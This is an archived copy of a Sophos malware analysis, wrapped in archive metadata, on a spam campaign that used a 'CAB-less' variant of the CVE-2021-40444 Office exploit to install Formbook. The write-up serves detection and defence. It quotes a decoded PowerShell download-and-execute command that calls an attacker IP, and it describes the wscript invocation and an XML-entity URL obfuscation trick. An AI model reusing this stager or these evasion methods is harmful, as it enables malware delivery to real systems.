{
    "id": "8e2efad4-9339-4980-affd-1bdcd9476fcc",
    "created_at": "2023-01-12T14:59:24.316266Z",
    "updated_at": "2025-03-27T02:06:00.159087Z",
    "deleted_at": null,
    "sha1_hash": "d8831a0e5928dc2b8a1e87cf869df4cebdc2bc7d",
    "title": "2021-12-21 - Attackers test “CAB-less 40444” exploit in a dry run",
    "authors": "",
    "file_creation_date": "2022-05-27T21:52:04Z",
    "file_modification_date": "2022-05-27T21:52:04Z",
    "file_size": 2204952,
    "plain_text": "# Attackers test “CAB-less 40444” exploit in a dry run\n\n**[news.sophos.com/en-us/2021/12/21/attackers-test-cab-less-40444-exploit-in-a-dry-run/](https://news.sophos.com/en-us/2021/12/21/attackers-test-cab-less-40444-exploit-in-a-dry-run/)**\n\nDecember 21, 2021\n\n**[Update (2021-12-23 1:00pm EST): A previous version of this story stated that the**\n**malformed RAR archive could not be opened in an earlier build of the WinRAR**\n**archiver. We have updated the story to explain how the RAR5 standard has changed**\n**and that WinRAR and other archiving tools now treat data preceding the Rar! magic**\n**bytes as if the archive contained self-extracting code. We have also tested the exploit**\n**on a testbed that has had the September, 2021 Cumulative Update, and while the Word**\n**document still was able to make a connection attempt, the remainder of the attack**\n**would not have completed due to the patch. We are unable to fully test this, because**\n**the malicious website hosting the exploit code has been shut down. We have added**\n**the label “[Updated]” to paragraphs that have been corrected. We apologize for giving**\n**a misleading impression that the exploit fully functions on a computer with the**\n**September (or later) Cumulative Updates installed.]**\n\n**[Update (2021-12-23 10:00am EST): an earlier version of this post suggested the CAB-**\n**less exploit shown here works on systems that have the September 2021 patch for**\n**CVE-2021-40444. That is not the case; the patch corrected the issue. The attack was**\n**only successful on unpatched Windows systems. Thanks to Mitja Kolsek of ACROS**\n**Security and Will Dormann at CERT/CC for pointing out the error.]**\n\nBack in September, Microsoft published a series of mitigation steps and released a patch to\na serious bug (designated CVE-2021-40444) in the Office suite of products. Criminals began\nexploiting the Microsoft MSHTML Remote Code Execution Vulnerability at least a week\n**before September’s Patch Tuesday, but the early mitigations (which involved disabling the**\n\n\n-----\n\ninstallation of ActiveX controls), and the patch (released a week later), were mostly\nsuccessful at stopping the exploits that criminals had been attempting to leverage to install\nmalware.\n\nSoon after Microsoft published these solutions, attackers morphed the attack in an attempt to\nget around the patch’s protection.\n\nThe maldoc attempts\n\nto contact a remote server as it opens the document for viewing\nBetween October 24 and 25, we received a small number of spam email samples that\ncontained weaponized file attachments; The attachments represent an escalation of the\nattacker’s abuse of the -40444 bug and demonstrate that even a patch can’t always mitigate\nthe actions of a motivated and sufficiently skilled attacker.\n\nEach of the messages shared the same body content, FROM: address, and malicious\nattachment.\n\nIn the initial versions of CVE-2021-40444 exploits, malicious Office document retrieved a\nmalware payload packaged into a Microsoft Cabinet (or .CAB) file. When Microsoft’s patch\nclosed that loophole, attackers discovered they could use a different attack chain altogether\nby enclosing the maldoc in a specially-crafted RAR archive. Because it doesn’t actually use\nthe CAB-style attack method, we’ve called it the CAB-less 40444 exploit. However, while it\n**may have evaded mitigations of CVE-2021-40444 without the September patch**\n**focused on the CAB-style attack, the changes in the September patch block the**\n**behavior described below.**\n\n\n-----\n\n## How the attack transpired\n\nOver a period of a bit more than a day, the attackers sent out spam emails that look like this\none. The only viable samples we received came in messages with an identical message\nbody and From: address. The message body contains two street addresses in Hungary, but\nused a From: address with a domain that was slightly different from that of a real business\nbased in Jamaica seemingly unconnected to the attack.\n\n\n-----\n\nAttached to the message was an archive file named Profile.rar. RAR archives are not\nunique or unusual as malicious file attachments, but this one had been malformed.\nPrepended to the RAR file was a script written in Windows Scripting Host notation, with the\nmalicious Word document immediately following the script text.\n\n**[Updated] WinRAR (and some other compression utilities) treat any data preceding the**\n“Rar!” header of a RAR file (shown in the image below), as a self extracting archive, but do\nno other checking of that data, such as making a determination that it is, in fact, selfextracting archive code. Archiving utilities that support self extracting archives would\ntherefore still be able to decompress this.\n\n\n-----\n\nA script\n\nembedded inside the .rar archive\n\n**[Updated] If a user decompresses this malicious RAR attachment and then opens the Word**\ndocument, the exploit triggers.\n\n\n-----\n\nThe malicious document contains a few unusually placed apostrophes in its bargain\nbasement social engineering style\n\nThe message\n\nindicating the malcode source URL flashes by quickly on the Word startup screen as the\ndocument loads, so don’t blink or you’ll miss it.\nIn a tool like Process Explorer, shown below, the Word document appears to invoke the RAR\narchive itself as though it were a Windows Scripting Host (WSH) script, a weird sort of\ncircular reference that (in theory) shouldn’t work, but does. Windows allows these kinds of\nscripts to mix together other scripting formats. Process Explorer shows the command line as\n**wscript.exe “.wsf:../../../[path where RAR was saved]/Profile.rar?.wsf”**\n\n\n-----\n\nBecause the text of the script appears before the magic bytes of the archive, the Windows\nScripting Host process wscript.exe successfully invokes the embedded PowerShell\ncommand in the RAR file.\n\nThat PowerShell command decodes a long string of base64-encoded text, which is itself a\nseparate scripting command that instructs PowerShell to retrieve a malware executable from\na remote website, and run it on the system as dllhostSvc.exe.\n\n## Why does this work?\n\n**[Updated] In theory, this attack just shouldn’t work. For systems that had the September**\n**update, it doesn’t. But in the timeframe of the attack, some systems may not have been**\npatched yet. It also worked because the compression utility treated the file as a selfextracting archive.\n\nAs with previous exploits against the -40444 bug, the attackers used an Office document that\ncontains an OLE Object (a mechanism to embed external files or documents), which in a\nnon-malicious document might be used to view or download a web page with JavaScript. But\nburied in the weaponized .docx (which is just a zipped collection of XML files), inside a file\nnamed “word/_rels/document.xml.rels,” the attackers embedded a line of code in the MHTML\nprotocol handler that looked like this.\n\nThe attackers knew\n\nit would be possible some security vendors would detect the plain text of a URL so they\nencoded it with XML character entity references. The value of &#x48 above declares a hex\n\n\n-----\n\nvalue of 48, which in ASCII is the letter H, &#x54 represents an ASCII T, and &#x50 is P…\nthe first letters in the familiar http:// protocol header in a URL.\n\nWhile there is no VBA or macro in the document that can execute, the attacker prompted the\nuser to “enable content” in the body of the Word document. Doing so triggers the computer\nto load a page at hxxp://104.244.78.177/Profile.html (obfuscation intentional).\n\n**[Updated] In a test of this functionality on a testbed on which the September update had**\nbeen applied, Word attempts to contact the remote website, before the program displays the\ndocument. It is not possible to test whether the full attack would be successful now, because\nthe website hosting the malicious code has been offline for several weeks.\n\nWhen we navigated to that page (when it was still live) in a browser, we only saw an Apache\nwelcome page:\n\nHowever, when we looked more closely at the source code of that page, there was some\nunusual, obfuscated Javascript code there.\n\n**[Updated] The JavaScript on the page would be executed within Office on an unpatched**\nsystem. The patch would have blocked the installation of any ActiveX controls in the context\nof Microsoft Word. The script used was an obfuscated version of the JavaScript already\npublished in a proof-of-concept for this technique to launch that original RAR file as a WSF.\n\n\n-----\n\nAfter partially decoding the Javascript, the XML commands become more clear towards the\nend of the code\nOnce the file is found, wscript.exe will run the WSF code, which in turn launches PowerShell.\nAs mentioned previously, the attack uses a base64 encoded PowerShell command.\nDecoding that reveals the final stage of exploitation:\n```\niex ((new-object\nsystem.net.webclient).downloadfile(\"hxxp://104.244.78.177/abb01.exe\",\"$env:LOCALAPPDAT\nProcess \"$env:LOCALAPPDATA\\dllhostSvc.exe\"\n\n```\nThis resulted in the computer downloading a malicious file into “AppData\\Local” and\nlaunching it. The Labs team later confirmed that this EXE was a sample of a malware family\ncalled Formbook.\n\n## Noisy over the network\n\nThis attack was particularly noisy from a network perspective.\n\nThe Javascript that runs on the Profile.html page creates a series of network requests that\nwas somewhat bizarre. The practical effect of the Javascript deobfuscating itself as it runs\ncauses a noticeable delay in the execution of the script, taking from five to eight seconds to\ncomplete the infection process and generating distinctive network traffic in the process.\n\n\n-----\n\nThe script running on\n\nProfile.html triggers the computer to make multiple requests to the page using different HTTP\nrequest “verbs” – not only the typical GET request, but also HEAD, OPTIONS, and\nPROPFIND. It’s this last HTTP request type that’s of interest not only because it’s unusual,\nbut because the purpose of that request type is for XML documents to request web-based\nresources – exactly what the exploit does.\n\nAt the end of this process, the script triggers Word to run the Windows Script Host, pointing it\nat the .rar file. The script invokes PowerShell, which (eventually) downloads the Formbook\npayload. Noticeably, while the other HTTP requests in this process all have User-Agent\nstrings, the final request that delivers the malware executable does not. Notably, the UserAgents that do get used during these requests make no sense: Some of the requests\npretend to be from an Internet Explorer 7 browser running on a version of Windows 8 that’s\nfive years past its best by date, and others appear to use the User-Agent string of Microsoft\n_Office Existence Discovery._\n\nAs for the malware payload itself, Formbook is an extremely noisy customer. The malware\ncommunicated with more than 50 servers over the course of about 18 hours, generating a\nhuge number of web requests that were also distinctive in that the bot connected to a URL\nwith the string /zxsc/ in the URI path on each server, and without a User-Agent in the request\nheader. It made many HTTP connections per minute following this pattern, which would be\nextremely obvious to anyone monitoring the network for unusually high volumes of\nanomalous activity. But many don’t.\n\n\n-----\n\nFormbook is a very noisy malware over the network, making many requests per minute\n\n## Patching quickly when exploits strike\n\nThis modified exploit disappeared after only a day in use, likely because of a low success\nrate because of the September patch.\n\n**[Updated] One thing that we noticed in the course of this investigation is that the older**\nversion of WinRAR on the test system could not function with these modified rar archive files.\nRecent editions of the program did not have this problem. When we originally tested this on a\ntestbed machine, the version of WinRAR installed on it (3.61) could not open the archive,\nthrowing an error.\n\n**[Updated] After communicating with the developers of the WinRAR archiving program, they**\nexplained that this particular version of WinRAR would not have supported the RAR5 selfextracting archive format, which is probably the reason why it reported the error message.\nWhen we installed the newest available build of WinRAR (6.10 beta 3), it was able to\nsuccessfully open and extract the maldoc from the archive file.\n\n\n-----\n\n**[Updated] So, unexpectedly, in this case, users of this specific, much older, outdated version**\nof WinRAR would not have been able to unpack the archive, though not as a result of any\ndeliberate effort.\n\n**[Updated] While that’s clearly unusual behavior, we wouldn’t recommend that you**\ndowngrade to an unsupported version of an archiver utility just because it broke this edgecase attack. Our conventional advice still applies here: When Microsoft publishes warnings\nabout exploits being used “in the wild,” this is what they mean. Someone, or some group of\npeople, was already using this exploit in a spam campaign, implementing it as soon as they\ndiscovered the technique and could turn it into an operational campaign.\n\nBut patching alone cannot prevent all vulnerabilities, in every case. Enabling all the\nrestrictions that would prevent a user from accidentally triggering a maldoc helps somewhat,\nbut people can (and frequently are) fooled into clicking that “Enable content” button. Learning\nthat doing this is, generally, a bad idea isn’t hard, but it needs to be reinforced. Training\nyourself to be reflexively suspicious of emailed documents, especially when they arrive in\nunusual or unfamiliar compressed file formats from people or companies you don’t know,\nsounds like a simple thing but it takes practice to recognize when something’s amiss. Learn\nto trust your instincts and check with the sender (or a knowlegeable person in the IT team) if\nyou run into something like this – preferably before opening it.\n\n**Detection guidance**\n\n\n-----\n\nSophos endpoint products will detect the weaponized document files that contain the\nCABless -40444 exploit as Troj/DocDL-AEOL; Sophos endpoint products generically detect\nFormbook malware based on longstanding static analysis rules. We’ve published indicators\nrelating to samples investigated in this report on the SophosLabs Github page and updated it\nwith additional IOCs including the Profile.html page.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-21 - Attackers test “CAB-less 40444” exploit in a dry run.pdf"
    ],
    "report_names": [
        "2021-12-21 - Attackers test “CAB-less 40444” exploit in a dry run.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535564,
    "ts_updated_at": 1743041160,
    "ts_creation_date": 1653688324,
    "ts_modification_date": 1653688324,
    "files": {
        "pdf": "https://archive.orkl.eu/d8831a0e5928dc2b8a1e87cf869df4cebdc2bc7d.pdf",
        "text": "https://archive.orkl.eu/d8831a0e5928dc2b8a1e87cf869df4cebdc2bc7d.txt",
        "img": "https://archive.orkl.eu/d8831a0e5928dc2b8a1e87cf869df4cebdc2bc7d.jpg"
    }
}